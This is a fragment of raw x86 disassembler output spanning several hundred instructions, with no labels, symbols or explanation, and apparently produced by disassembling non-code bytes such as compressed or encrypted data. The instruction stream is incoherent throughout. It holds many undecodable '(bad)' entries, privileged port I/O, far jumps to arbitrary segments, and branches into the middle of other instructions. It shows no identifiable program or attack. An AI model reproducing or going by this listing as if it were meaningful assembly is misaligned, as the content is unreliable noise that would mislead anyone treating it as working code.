  4223df:	ror    BYTE PTR [esi-0x72797fbf],1
  4223e5:	dec    esp
  4223e6:	rol    BYTE PTR [eax],0x79
  4223e9:	mov    dl,0x72
  4223eb:	and    eax,0xe0bbf27a
  4223f0:	xor    eax,0x6cf032df
  4223f5:	push   ss
  4223f6:	pusha  
  4223f7:	mov    ebx,0xefe31528
  4223fc:	(bad)  
  4223fd:	mov    esi,0x37e04f5c
  422402:	adc    BYTE PTR [ebx],0x54
  422405:	push   edx
  422406:	or     eax,0xdf38151a
  42240b:	addr16 cs aaa 
  42240e:	dec    edi
  42240f:	jmp    0xe084:0xc5ade000
  422416:	je     0x42246e
  422418:	adc    eax,0x892605d3
  42241d:	xor    ch,BYTE PTR [ebx+0x285b7660]
  422423:	out    0x3b,al
  422425:	dec    DWORD PTR [esi+0x6154e58f]
  42242b:	sti    
  42242c:	out    dx,al
  42242d:	dec    esi
  42242e:	ret    0x84f0
  422431:	and    BYTE PTR [esi+0x26a5c25d],dl
  422437:	mov    WORD PTR [esi+0x30],cs
  42243a:	sbb    edx,ebx
  42243c:	clc    
  42243d:	fld    DWORD PTR [ebp-0x7b623e28]
  422443:	mov    dh,bh
  422445:	mov    dh,0x2b
  422447:	dec    edx
  422448:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422449:	xchg   esp,eax
  42244a:	stc    
  42244b:	xchg   edx,eax
  42244c:	pop    ecx
  42244d:	mov    esi,0x94718f72
  422452:	mov    cl,0x76
  422454:	fidivr DWORD PTR [edi]
  422456:	and    eax,0x7b4f16c7
  42245b:	xchg   esp,eax
  42245c:	bnd jge 0x422468
  42245f:	je     0x42240f
  422461:	rol    bl,cl
  422463:	adc    DWORD PTR [edi+eax*1],ebp
  422466:	adc    DWORD PTR [esi],eax
  422468:	mov    bh,BYTE PTR [esi]
  42246a:	outs   dx,DWORD PTR ds:[esi]
  42246b:	push   ebp
  42246c:	inc    esp
  42246d:	shr    esi,0xe
  422470:	dec    ecx
  422471:	(bad)  
  422472:	sub    BYTE PTR [edx],dh
  422474:	or     DWORD PTR [eax],esi
  422476:	jne    0x42249b
  422478:	in     eax,0x79
  42247a:	jge    0x422435
  42247c:	cwde   
  42247d:	push   0xffffff93
  42247f:	ret    0x8f24
  422482:	sbb    BYTE PTR [eax+0x14],ch
  422485:	call   0x1042e64f
  42248a:	pop    ecx
  42248b:	in     eax,dx
  42248c:	sbb    bh,BYTE PTR [esi]
  42248e:	push   edx
  42248f:	cmp    al,0x92
  422491:	pop    ss
  422492:	adc    ebp,DWORD PTR [eax+eax*1-0x74]
  422496:	jg     0x4224a7
  422498:	push   0x97fe3b5
  42249d:	inc    edx
  42249e:	(bad)  
  42249f:	stc    
  4224a0:	mov    eax,0x1f8c711c
  4224a5:	mov    al,ds:0xaca6bbe9
  4224aa:	xchg   BYTE PTR [esi+0x5b654f1d],bl
  4224b0:	jge    0x4224ff
  4224b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4224b3:	icebp  
  4224b4:	in     eax,0xb5
  4224b6:	and    al,0xed
  4224b8:	fwait
  4224b9:	loopne 0x4224c3
  4224bb:	stos   BYTE PTR es:[edi],al
  4224bc:	mov    edi,0x32102500
  4224c1:	clc    
  4224c2:	sbb    ecx,DWORD PTR [edi-0x29b0fb28]
  4224c8:	push   eax
  4224ca:	out    0x71,eax
  4224cc:	inc    ebp
  4224cd:	push   ecx
  4224ce:	imul   ecx,DWORD PTR [ecx],0x64681666
  4224d4:	inc    ecx
  4224d5:	pop    ecx
  4224d6:	and    eax,0xed1c33ec
  4224db:	mov    cl,0x50
  4224dd:	(bad)  
  4224de:	jno    0x422493
  4224e0:	mov    ah,al
  4224e2:	mov    bl,0x20
  4224e4:	out    dx,eax
  4224e5:	int3   
  4224e6:	pop    esi
  4224e7:	dec    ecx
  4224e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4224e9:	ins    DWORD PTR es:[edi],dx
  4224ea:	or     al,0xb6
  4224ec:	ret    0x74e
  4224ef:	call   FWORD PTR [ecx+0x4b]
  4224f2:	sub    BYTE PTR [esi],0x2f
  4224f5:	retf   0xcb91
  4224f8:	mulps  xmm3,XMMWORD PTR [edx]
  4224fb:	push   edx
  4224fc:	int    0x51
  4224fe:	jns    0x422512
  422500:	inc    esp
  422501:	mov    al,0x2e
  422503:	add    ebp,esi
  422505:	ins    DWORD PTR es:[edi],dx
  422506:	adc    BYTE PTR [edx-0x58],ch
  422509:	mov    ebp,DWORD PTR [ebx]
  42250b:	jle    0x4224eb
  42250d:	std    
  42250e:	lock sub edx,DWORD PTR [ebp-0x737fc776]
  422515:	mov    al,0xd5
  422517:	push   ss
  422518:	xor    eax,0xcc6ba0a4
  42251d:	adc    esp,DWORD PTR [edi+ecx*1+0x1c]
  422521:	mov    ecx,0x31173b5c
  422526:	xlat   BYTE PTR ds:[ebx]
  422527:	aas    
  422528:	rcl    BYTE PTR [ebx+0x1c],cl
  42252b:	xlat   BYTE PTR ds:[ebx]
  42252c:	in     al,0xac
  42252e:	pop    ds
  42252f:	repnz mov bh,0x40
  422532:	out    0x5b,eax
  422534:	mov    cl,0x7
  422536:	imul   edi,DWORD PTR [edi+0x62],0xf1e885c7
  42253d:	out    0x72,al
  42253f:	sub    DWORD PTR [ebp-0x3013287e],0x55634395
  422549:	out    0x7b,eax
  42254b:	inc    eax
  42254c:	out    dx,eax
  42254d:	daa    
  42254e:	(bad)  
  422550:	jle    0x42256d
  422552:	mov    edx,0xc8f6beba
  422557:	or     DWORD PTR [ecx-0x4b3d1fbf],0xffffffe3
  42255e:	das    
  42255f:	mov    ds,WORD PTR [edx-0x26]
  422562:	outs   dx,DWORD PTR ds:[esi]
  422563:	inc    ebx
  422564:	pop    es
  422565:	loopne 0x422591
  422567:	mov    al,ds:0xa1a5dfc8
  42256c:	int3   
  42256d:	lds    edx,FWORD PTR [esi-0x3cc7b4a3]
  422573:	pop    esp
  422574:	mov    ch,0x87
  422576:	aas    
  422577:	ffree  st(6)
  422579:	mov    dl,0xf8
  42257b:	in     eax,0x38
  42257d:	les    eax,FWORD PTR [edx-0x36]
  422580:	mov    DWORD PTR [edi-0x7b],esp
  422583:	call   0xda046fa9
  422588:	inc    esi
  422589:	fwait
  42258a:	out    0x89,eax
  42258c:	out    0xe4,eax
  42258e:	xchg   ecx,eax
  42258f:	imul   eax,esp,0xffffffd6
  422592:	adc    DWORD PTR [ecx],edi
  422594:	loop   0x422613
  422596:	ja     0x4225ff
  422598:	sbb    cl,bl
  42259a:	test   DWORD PTR [edi+0x2a],edi
  42259d:	scas   eax,DWORD PTR es:[edi]
  42259e:	dec    ebx
  42259f:	loopne 0x42258a
  4225a1:	in     al,0x57
  4225a3:	jae    0x422617
  4225a5:	rcl    BYTE PTR [esi],cl
  4225a7:	outs   dx,BYTE PTR es:[esi]
  4225a9:	dec    ebx
  4225aa:	adc    al,0x57
  4225ac:	repnz outs dx,BYTE PTR ds:[esi]
  4225ae:	add    BYTE PTR [ecx+0x42],bl
  4225b1:	inc    edx
  4225b2:	fist   WORD PTR [eax-0x5ca20c2b]
  4225b8:	ret    0xf728
  4225bb:	fs retf 0x65cf
  4225bf:	aas    
  4225c0:	cmp    BYTE PTR [edx+0xc],0x15
  4225c4:	xchg   ebp,eax
  4225c5:	ins    DWORD PTR es:[edi],dx
  4225c6:	adc    BYTE PTR [eax+ebp*2+0x43496380],dl
  4225cd:	out    dx,eax
  4225ce:	pop    ebp
  4225cf:	add    ch,dh
  4225d1:	xchg   ebx,eax
  4225d2:	stos   DWORD PTR es:[edi],eax
  4225d3:	loop   0x42255e
  4225d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4225d6:	in     eax,0xaf
  4225d8:	int3   
  4225d9:	das    
  4225da:	pop    ebx
  4225db:	jp     0x4225f7
  4225dd:	cli    
  4225de:	mov    dh,0x2f
  4225e0:	(bad)  
  4225e1:	fwait
  4225e2:	cs aad 0xa7
  4225e5:	out    dx,eax
  4225e6:	rcl    BYTE PTR [esi],0xfa
  4225e9:	xchg   BYTE PTR [eax],dl
  4225eb:	nop    DWORD PTR [ecx-0x45a794aa]
  4225f2:	pop    edx
  4225f3:	fdivr  QWORD PTR ds:0x68f54c76
  4225f9:	jnp    0x42262e
  4225fb:	add    ebx,DWORD PTR ds:0x6362eaf5
  422601:	jne    0x422656
  422603:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422604:	sbb    al,0xdd
  422606:	jbe    0x422635
  422608:	inc    ebx
  422609:	pushf  
  42260a:	aas    
  42260b:	imul   ebx,DWORD PTR [eax+0xec99aec],0xffffffd7
  422612:	mov    dh,0xb3
  422614:	pop    es
  422615:	in     eax,0x2a
  422617:	xor    DWORD PTR [eax],ebx
  422619:	lock mov ebp,0x159a9979
  42261f:	sub    DWORD PTR [ebx+0x4e2ead86],edi
  422625:	or     ch,BYTE PTR ds:0x28efbe8e
  42262b:	jg     0x4225d9
  42262d:	leave  
  42262e:	dec    ecx
  42262f:	aam    0xb2
  422631:	test   ecx,ebp
  422633:	sar    DWORD PTR [eax+0x48],1
  422636:	fnstsw WORD PTR [edx+0x6ed605dd]
  42263c:	mov    bh,0x53
  42263e:	push   0x983d1a51
  422643:	popa   
  422644:	xor    ebp,DWORD PTR [edx+esi*1+0x21bdcd7c]
  42264b:	test   BYTE PTR [ebx-0x6d3c500d],0x51
  422652:	push   cs
  422653:	push   edi
  422654:	cmc    
  422655:	int    0x64
  422657:	lods   al,BYTE PTR ds:[esi]
  422658:	and    BYTE PTR [eax-0x6a],0x8
  42265c:	mov    al,ds:0xf57d5379
  422661:	aam    0xcd
  422663:	cmp    al,0x3e
  422665:	paddsw mm4,QWORD PTR [edi+ebx*2-0x354c912a]
  42266d:	icebp  
  42266e:	pop    edx
  42266f:	stos   DWORD PTR es:[edi],eax
  422670:	mov    BYTE PTR fs:[edi],ch
  422673:	pop    ebx
  422674:	sti    
  422675:	(bad)  
  422676:	imul   ebp,DWORD PTR [ebx],0xffffffe7
  422679:	xchg   edx,eax
  42267a:	push   ss
  42267b:	(bad)  
  42267c:	jmp    0xe0393c5f
  422681:	xchg   ebx,eax
  422682:	or     al,0xfb
  422684:	retf   
  422685:	jmp    0xdc6a:0x838ad320
  42268c:	sti    
  42268d:	loopne 0x42264b
  42268f:	and    ecx,ebp
  422691:	fwait
  422692:	xchg   edi,eax
  422693:	sar    DWORD PTR ds:[edi-0x6],1
  422697:	jge    0x4226db
  422699:	jb     0x42269c
  42269b:	mov    ds:0xaf02bed3,al
  4226a0:	xor    al,0xb3
  4226a3:	add    dh,BYTE PTR [ebp-0x743a2a25]
  4226a9:	into   
  4226aa:	jle    0x42263e
  4226ac:	push   ebx
  4226ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4226ae:	mov    ch,0xfa
  4226b0:	clc    
  4226b1:	dec    ebx
  4226b2:	popf   
  4226b3:	mov    eax,0xaf58d6a2
  4226b8:	adc    BYTE PTR [ebp-0x73],dh
  4226bb:	mov    ebx,0x6823956e
  4226c0:	mov    edx,0xfb8b8b36
  4226c5:	mov    ah,0x54
  4226c7:	sub    eax,0x179ffae8
  4226cc:	lahf   
  4226cd:	xor    ebp,DWORD PTR [eax-0x46]
  4226d0:	jp     0x42270b
  4226d2:	(bad)  
  4226d4:	adc    DWORD PTR [ebp-0x34],edi
  4226d7:	lahf   
  4226d8:	adc    ch,BYTE PTR [esi+0x1fe7c3c9]
  4226de:	or     edi,esi
  4226e0:	rcr    DWORD PTR [ebx+0xf],1
  4226e3:	pop    ecx
  4226e4:	and    bh,ah
  4226e6:	dec    edi
  4226e7:	leave  
  4226e8:	mul    BYTE PTR [ebx]
  4226ea:	inc    ecx
  4226eb:	popa   
  4226ec:	add    eax,0x58ed5399
  4226f1:	je     0x422753
  4226f3:	jb     0x422744
  4226f5:	out    0xfb,eax
  4226f7:	ret    0xa28
  4226fa:	dec    esp
  4226fb:	inc    eax
  4226fc:	mov    cl,0xcf
  4226fe:	mov    DWORD PTR [edi],esp
  422700:	pop    edi
  422701:	dec    ecx
  422702:	mul    BYTE PTR [ebp+esi*2+0x7b]
  422706:	inc    edx
  422708:	inc    ecx
  422709:	jno    0x4226ea
  42270b:	xlat   BYTE PTR ds:[ebx]
  42270c:	adc    DWORD PTR [ecx],ebp
  42270e:	pop    esp
  42270f:	jno    0x422695
  422711:	lods   eax,DWORD PTR ds:[esi]
  422712:	je     0x422755
  422714:	push   ecx
  422715:	pop    es
  422716:	mov    ah,0xdc
  422718:	cmp    al,0x46
  42271a:	fucom  st(6)
  42271c:	sbb    DWORD PTR [edx-0x2092dc0c],esp
  422722:	sub    eax,0x8428f780
  422727:	pop    edi
  422728:	xchg   esp,eax
  422729:	loope  0x422737
  42272b:	or     edi,DWORD PTR [ebp+0x70]
  42272e:	push   ss
  42272f:	jge    0x42271a
  422731:	retf   
  422732:	xchg   BYTE PTR [ebx+esi*8-0x69],bh
  422736:	mov    cs,ebp
  422738:	add    al,0x12
  42273a:	jae    0x4226e1
  42273c:	scas   al,BYTE PTR es:[edi]
  42273d:	enter  0xa2b1,0x36
  422741:	jecxz  0x4226d8
  422743:	or     al,BYTE PTR [edi-0x9]
  422746:	retf   
  422747:	push   esp
  422748:	es scas al,BYTE PTR es:[edi]
  42274a:	xchg   esi,eax
  42274b:	ss xor edx,edi
  42274e:	jmp    0x42276b
  422750:	ins    DWORD PTR es:[edi],dx
  422751:	jns    0x422723
  422753:	int    0x50
  422755:	jns    0x42279e
  422757:	inc    edx
  422758:	and    dh,BYTE PTR [edi]
  42275a:	dec    edi
  42275b:	add    ch,BYTE PTR [edx]
  42275d:	mov    cl,0xfa
  42275f:	dec    ecx
  422760:	adc    al,ch
  422762:	pop    ebp
  422763:	(bad)  
  422764:	jb     0x42271c
  422766:	mov    ebp,0x6c1201ff
  42276b:	arpl   WORD PTR [ebx+0x38adc151],bx
  422771:	out    dx,eax
  422772:	dec    esi
  422773:	in     eax,0x26
  422775:	and    eax,0x2aa7b95c
  42277a:	push   es
  42277b:	mov    ecx,0x4a5a3c72
  422780:	cdq    
  422781:	sbb    ecx,DWORD PTR [esi-0x1cb7ae70]
  422787:	jmp    0xee20:0x7df4e0d9
  42278e:	ret    
  42278f:	idiv   DWORD PTR [eax+0x40]
  422792:	inc    esp
  422793:	xor    BYTE PTR [ecx],ch
  422795:	sbb    ch,BYTE PTR [ebx-0x303c50e3]
  42279b:	cdq    
  42279c:	xchg   ebx,eax
  42279d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42279e:	inc    eax
  42279f:	push   ss
  4227a0:	or     BYTE PTR [ebx-0x4f8da9ae],cl
  4227a6:	jge    0x42278a
  4227a8:	pop    ss
  4227a9:	fstp   TBYTE PTR [edi+0x142baf95]
  4227af:	stc    
  4227b0:	in     eax,0xe0
  4227b2:	sbb    BYTE PTR [edx-0x5f],bl
  4227b5:	sar    BYTE PTR [edi],0xb8
  4227b8:	pop    esi
  4227b9:	mov    al,ds:0x48c46a51
  4227be:	mov    edx,0x28e3303a
  4227c3:	inc    esp
  4227c4:	jb     0x4227f6
  4227c6:	and    al,BYTE PTR [ebx+ecx*8+0x4108df4c]
  4227cd:	push   esi
  4227ce:	inc    ebx
  4227cf:	repnz mov al,0xe8
  4227d2:	into   
  4227d3:	add    BYTE PTR [edi+0x3a3671f8],dh
  4227d9:	dec    ebp
  4227da:	leave  
  4227db:	push   ebp
  4227dc:	mov    bh,BYTE PTR [ebx+0x597b2b77]
  4227e2:	adc    eax,ebp
  4227e4:	mov    eax,ds:0x34139e16
  4227e9:	push   ds
  4227ea:	lds    ecx,FWORD PTR [edx+edi*8+0x2466b8a6]
  4227f1:	jecxz  0x422808
  4227f3:	or     al,0x34
  4227f5:	cdq    
  4227f6:	popa   
  4227f7:	mov    al,ds:0x442ba7c
  4227fc:	mov    ch,0xef
  4227fe:	(bad)  
  422800:	xchg   edx,eax
  422801:	in     eax,dx
  422802:	iret   
  422803:	mov    ds:0xef074fe6,eax
  422808:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422809:	jecxz  0x42284f
  42280b:	fdiv   st,st(7)
  42280d:	adc    bh,BYTE PTR [edi-0xb]
  422810:	out    0x41,eax
  422812:	hlt    
  422813:	stos   DWORD PTR es:[edi],eax
  422814:	mov    ecx,0xd61e6fdc
  422819:	(bad)  
  42281a:	pushf  
  42281b:	(bad)  
  42281c:	ins    BYTE PTR es:[edi],dx
  42281d:	rcr    bl,0x26
  422820:	mov    bh,0x34
  422822:	sti    
  422823:	stc    
  422824:	jne    0x42286e
  422826:	in     al,dx
  422827:	stos   BYTE PTR es:[edi],al
  422828:	xchg   edi,eax
  422829:	jbe    0x42282f
  42282b:	pop    esi
  42282c:	test   eax,0xc6ee5eb1
  422831:	mov    ecx,0x613e3244
  422836:	ss jo  0x42286b
  422839:	inc    ebx
  42283a:	pusha  
  42283b:	lea    edi,[edi]
  42283d:	sbb    dh,dh
  42283f:	add    dl,dh
  422841:	popa   
  422842:	jmp    0x42287f
  422844:	test   ebp,ebx
  422846:	cmp    DWORD PTR [ecx],esp
  422848:	push   esi
  422849:	mov    edi,0xf6794477
  42284e:	inc    edi
  42284f:	pop    ds
  422850:	or     al,0x4e
  422852:	sbb    esp,DWORD PTR [eax-0x39]
  422855:	jns    0x4227ea
  422857:	mov    bh,0xc4
  422859:	retf   
  42285a:	cwde   
  42285b:	xchg   ecx,eax
  42285c:	(bad)  
  42285d:	xor    ebx,DWORD PTR [edx-0x2572f04e]
  422863:	cmp    eax,0x49e29c60
  422868:	(bad)  
  422869:	out    0xb4,al
  42286b:	in     eax,dx
  42286c:	mov    bh,0xe0
  42286e:	jne    0x422894
  422870:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  422872:	adc    esp,0xffffffc2
  422875:	fistp  QWORD PTR [eax+0x73e5c9b8]
  42287b:	sub    BYTE PTR [edx+0x67],bh
  42287e:	jecxz  0x422886
  422880:	xor    al,0xd
  422882:	push   ss
  422883:	jl     0x4228e5
  422885:	rcl    DWORD PTR [esi-0x4bc4560d],0x49
  42288c:	(bad)  
  42288d:	out    0x96,eax
  42288f:	les    ebx,FWORD PTR [ebx+0x16]
  422892:	shr    BYTE PTR [esi-0xf],cl
  422895:	inc    esi
  422896:	scas   eax,DWORD PTR es:[edi]
  422897:	pop    edi
  422898:	dec    ecx
  422899:	ret    0xb02d
  42289c:	in     eax,0x8a
  42289e:	mov    ah,0xdc
  4228a0:	add    eax,0x3dbd11f6
  4228a5:	jmp    0x10fb:0x7f2e85d3
  4228ac:	mov    ch,0xa5
  4228ae:	add    edx,ecx
  4228b0:	aas    
  4228b1:	dec    ecx
  4228b2:	sbb    BYTE PTR [esi],al
  4228b4:	and    ch,bh
  4228b6:	pop    edx
  4228b7:	sbb    eax,0xfe491f6b
  4228bc:	addr16 jbe 0x422850
  4228bf:	ret    
  4228c0:	jl     0x42289c
  4228c2:	add    BYTE PTR [ebp-0x73],dl
  4228c5:	imul   edi,DWORD PTR [ebp-0x32],0xffffffab
  4228c9:	push   0xa247034b
  4228ce:	pop    esp
  4228cf:	aas    
  4228d0:	sub    ebx,DWORD PTR [ebp-0x4bf7ea99]
  4228d6:	neg    BYTE PTR [esi]
  4228d8:	mov    al,0x2a
  4228da:	cld    
  4228db:	or     edi,DWORD PTR [esi+0x1d5371ec]
  4228e1:	scas   al,BYTE PTR es:[edi]
  4228e2:	mov    dl,BYTE PTR [ebp-0x23]
  4228e5:	lds    eax,FWORD PTR [eax-0x75]
  4228e8:	mov    ecx,DWORD PTR [esi-0x58041e0e]
  4228ee:	icebp  
  4228ef:	and    dh,BYTE PTR [ecx]
  4228f1:	ror    dh,0x3d
  4228f4:	push   ss
  4228f5:	mov    ebp,0xf48feb02
  4228fa:	sbb    dh,BYTE PTR [eax-0x321d6c17]
  422900:	lods   eax,DWORD PTR ds:[esi]
  422901:	aaa    
  422902:	nop
  422903:	fistp  DWORD PTR [ebx]
  422905:	es loopne 0x4228ac
  422908:	jae    0x42289a
  42290a:	mov    eax,0xdbe52e8a
  42290f:	push   es
  422910:	sub    ch,dh
  422912:	shl    DWORD PTR cs:[ecx-0x5d2f8c7c],0xf
  42291a:	jnp    0x422973
  42291c:	add    bh,BYTE PTR [ecx]
  42291e:	repz cld 
  422920:	sub    ah,BYTE PTR [ebp+0x51991a12]
  422926:	call   0xf802f789
  42292b:	add    eax,0x56043b75
  422930:	jne    0x422977
  422932:	cmp    al,0xc3
  422934:	aas    
  422935:	mov    ah,0x7b
  422937:	xchg   ecx,eax
  422938:	adc    DWORD PTR [edi+eiz*8-0x7c],esp
  42293c:	jne    0x4228d3
  42293e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42293f:	jbe    0x4228c3
  422941:	(bad)  
  422942:	aad    0x26
  422944:	fild   WORD PTR [edi+0x4e]
  422947:	and    ah,BYTE PTR [ebp-0x3a9cbd16]
  42294d:	stos   DWORD PTR es:[edi],eax
  42294e:	repnz (bad) 
  422950:	jg     0x4229a9
  422952:	pop    esi
  422953:	mov    dl,0x35
  422955:	pand   mm0,QWORD PTR [ebx]
  422958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422959:	mov    ebx,DWORD PTR [esi-0x386eb36b]
  42295f:	inc    ebp
  422960:	data16 sub BYTE PTR [esi+0x8],0xe
  422965:	je     0x422957
  422967:	xchg   ecx,eax
  422968:	je     0x42298b
  42296a:	mov    dl,0xa6
  42296c:	imul   esp,DWORD PTR [esi+0x18],0x5e03219d
  422973:	ja     0x422981
  422975:	jecxz  0x422965
  422977:	mov    ds:0xdc94419,al
  42297c:	in     al,dx
  42297d:	pop    es
  42297e:	push   ds
  42297f:	leave  
  422980:	aam    0x42
  422982:	jmp    0x54ca:0x8a2dc2cb
  422989:	(bad)  
  42298a:	pop    edx
  42298b:	xchg   ecx,eax
  42298c:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42298e:	add    al,0xa8
  422990:	pop    es
  422991:	das    
  422992:	(bad)  
  422994:	pushf  
  422995:	dec    edx
  422996:	pop    esp
  422997:	inc    ecx
  422998:	es mov edx,0x989437fb
  42299e:	add    al,0x0
  4229a0:	mov    dl,0xb1
  4229a2:	cmp    bl,BYTE PTR [ecx+0x6ead60]
  4229a8:	dec    eax
  4229a9:	sub    edx,esp
  4229ab:	add    dh,BYTE PTR [esi+0x25e8df73]
  4229b1:	inc    edi
  4229b2:	pop    edi
  4229b3:	mov    ah,0xc2
  4229b5:	mov    ebx,0x9be26610
  4229ba:	mov    ch,0x9e
  4229bc:	mov    al,ds:0x496760ec
  4229c1:	daa    
  4229c2:	jbe    0x422a12
  4229c4:	(bad)  [edi+0x2b]
  4229c7:	mov    ah,0x30
  4229c9:	(bad)  
  4229ca:	dec    ebx
  4229cb:	pusha  
  4229cc:	cdq    
  4229cd:	repz and eax,0x2a53a09e
  4229d3:	xchg   ebp,eax
  4229d4:	and    cl,BYTE PTR [edi+edx*8+0x306e3a32]
  4229db:	xchg   esp,eax
  4229dc:	add    al,0xa6
  4229de:	int    0x16
  4229e0:	imul   esi,DWORD PTR [ecx-0x59aae6cf],0x26258f8f
  4229ea:	stc    
  4229eb:	call   0xdf37:0x56f33dba
  4229f2:	cmp    al,BYTE PTR [ebx+eiz*1+0x25b13afb]
  4229f9:	mov    eax,0x1d278fe9
  4229fe:	xchg   edi,eax
  422a00:	or     ecx,esi
  422a02:	xchg   ebp,eax
  422a03:	xlat   BYTE PTR ds:[ebx]
  422a04:	pop    ebp
  422a05:	adc    esi,DWORD PTR [ebp+0x2c5ca4ea]
  422a0b:	pop    edi
  422a0c:	pop    ebx
  422a0d:	or     eax,0xb3156b8
  422a12:	and    BYTE PTR [edi+0xa1793b6],cl
  422a18:	ds test BYTE PTR gs:[esi-0x4f],bl
  422a1d:	push   edi
  422a1e:	cmp    ah,dh
  422a20:	push   0x42
  422a22:	shl    BYTE PTR [esi-0x78],cl
  422a25:	xor    cl,bh
  422a27:	lahf   
  422a28:	xor    ah,ah
  422a2a:	xchg   ebx,eax
  422a2b:	push   eax
  422a2c:	push   ss
  422a2d:	mov    ebp,0x388eb066
  422a32:	stos   DWORD PTR es:[edi],eax
  422a33:	xchg   ebp,eax
  422a34:	fwait
  422a35:	aas    
  422a36:	xchg   esp,eax
  422a37:	cwde   
  422a38:	aas    
  422a39:	and    BYTE PTR [eax-0x69],ah
  422a3c:	mov    esi,0x1bc3b6f5
  422a41:	xor    eax,0xefe1fd3d
  422a46:	sub    DWORD PTR [ebx+esi*1-0x7f],0x91a2f463
  422a4e:	icebp  
  422a4f:	cmp    al,0x2c
  422a51:	data16 sub al,0x8c
  422a54:	pop    esi
  422a55:	xchg   edi,eax
  422a56:	xor    DWORD PTR [esi],ebx
  422a58:	xchg   BYTE PTR [ebx-0x1b],ah
  422a5b:	adc    DWORD PTR [edi+0x6873f257],eax
  422a61:	cli    
  422a62:	les    edx,FWORD PTR [esp+edx*1]
  422a65:	sbb    edx,DWORD PTR ds:[esi]
  422a68:	xor    esp,DWORD PTR [eax+0x42ba4fd0]
  422a6e:	stc    
  422a6f:	cdq    
  422a70:	ror    BYTE PTR [ebx+0x6d306c46],0xfe
  422a77:	sbb    eax,0xc4c3fa2c
  422a7c:	fld    QWORD PTR [ebp+0x2584eb40]
  422a82:	push   esi
  422a83:	pop    ss
  422a84:	jo     0x422a9b
  422a86:	or     DWORD PTR [ebx+eiz*8],ebx
  422a89:	arpl   WORD PTR [esi],sp
  422a8b:	dec    ebx
  422a8c:	out    0x66,al
  422a8e:	fldenv [esi]
  422a90:	bound  ebx,QWORD PTR es:[eax-0x5c]
  422a94:	lods   eax,DWORD PTR ds:[esi]
  422a95:	mov    dl,0xcd
  422a97:	xor    BYTE PTR [ebp+0x20],dh
  422a9a:	or     esi,DWORD PTR [ebx]
  422a9c:	out    0x51,al
  422a9e:	fbld   TBYTE PTR [ecx+0x7b]
  422aa1:	sbb    DWORD PTR [edx-0x9e465fd],esi
  422aa7:	and    ebp,DWORD PTR [ecx+0x517c5cb6]
  422aad:	mov    cl,0x8d
  422aaf:	mov    eax,ds:0x1bd98c82
  422ab4:	inc    ebp
  422ab5:	inc    edi
  422ab6:	push   edi
  422ab7:	hlt    
  422ab8:	cmp    al,BYTE PTR [edi]
  422aba:	ret    0xd0e7
  422abd:	ins    DWORD PTR es:[edi],dx
  422abe:	data16 mov al,ds:0xdda663e1
  422ac4:	addr16 jae 0x422abb
  422ac7:	lahf   
  422ac8:	sub    esp,ebx
  422aca:	shl    esp,1
  422acc:	or     al,bl
  422ace:	pop    ds
  422acf:	test   al,0xfa
  422ad1:	call   0x6704de79
  422ad6:	fcomp  DWORD PTR [edx-0x3ee939e1]
  422adc:	pop    ds
  422add:	imul   ebp,ebp,0xa464d439
  422ae3:	mov    edx,0xdf41c647
  422ae8:	sub    eax,0x2b47c1b6
  422aed:	cmp    eax,0x377b31de
  422af2:	out    0x90,eax
  422af4:	add    dh,dh
  422af6:	and    bh,BYTE PTR [ebp+0x4e8df548]
  422afc:	stc    
  422afd:	ja     0x422b52
  422aff:	mov    eax,ds:0x5d2f8e1f
  422b04:	mov    edi,0x73cdbde0
  422b09:	jmp    0x8e8a:0xe5e93017
  422b10:	add    BYTE PTR [ebx+ecx*4],bh
  422b13:	mov    bh,dl
  422b15:	xchg   BYTE PTR [ecx-0x7f6f4d8c],dh
  422b1b:	mov    DWORD PTR [esi],0x3e503b8
  422b21:	frstor [edx-0x3a]
  422b24:	bnd ret 
  422b26:	jmp    0xb352:0x7afdf571
  422b2d:	mov    al,ds:0xb07cd25f
  422b32:	ins    DWORD PTR es:[edi],dx
  422b33:	test   BYTE PTR [edx+0x50],al
  422b36:	(bad)  
  422b38:	jo     0x422b0b
  422b3a:	loope  0x422b14
  422b3c:	jp     0x422ba1
  422b3e:	xor    al,0x59
  422b40:	sub    al,0x14
  422b42:	cmp    al,0xbe
  422b44:	add    bh,dl
  422b46:	cs push ebx
  422b48:	outs   dx,DWORD PTR ds:[esi]
  422b49:	bound  edx,QWORD PTR [esi-0x5]
  422b4c:	dec    esi
  422b4d:	inc    esi
  422b4e:	xchg   ebp,eax
  422b4f:	xor    ebx,DWORD PTR [ebx-0x32787ac6]
  422b55:	lds    edx,FWORD PTR [edx+0x462080c5]
  422b5b:	sbb    esi,DWORD PTR [ecx]
  422b5d:	mov    ds:0xa91cf4ce,al
  422b62:	imul   edx,DWORD PTR [ebp+ecx*8+0x7a7b5aa8],0xffffffa2
  422b6a:	xor    eax,0x3d110bd5
  422b6f:	fwait
  422b70:	pop    ecx
  422b71:	mov    ds:0xa28e5b21,eax
  422b76:	jnp    0x422b8f
  422b78:	inc    esp
  422b79:	xlat   BYTE PTR ds:[ebx]
  422b7a:	jb     0x422b26
  422b7c:	(bad)  
  422b7d:	pop    ds
  422b7e:	imul   ecx,DWORD PTR [ebp-0x6d5086e6],0xffffffc1
  422b85:	cmp    BYTE PTR [ebp-0x75],bh
  422b88:	or     eax,0x42ad8527
  422b8d:	sub    edi,ebx
  422b8f:	(bad)  
  422b90:	inc    eax
  422b91:	cs xchg esi,eax
  422b93:	mov    ebx,0x2c144004
  422b98:	fidivr DWORD PTR [eax-0x50b4d30a]
  422b9e:	pop    eax
  422b9f:	pop    ss
  422ba0:	sbb    ebp,DWORD PTR [eax+0x4bd3ec9c]
  422ba6:	mov    cs,edi
  422ba8:	es push edi
  422baa:	xchg   edx,eax
  422bab:	cmp    eax,0xb31a5be6
  422bb0:	mov    bl,0xd4
  422bb2:	or     eax,0xd4ac811a
  422bb7:	jp     0xab423c6c
  422bbd:	pop    edi
  422bbe:	sahf   
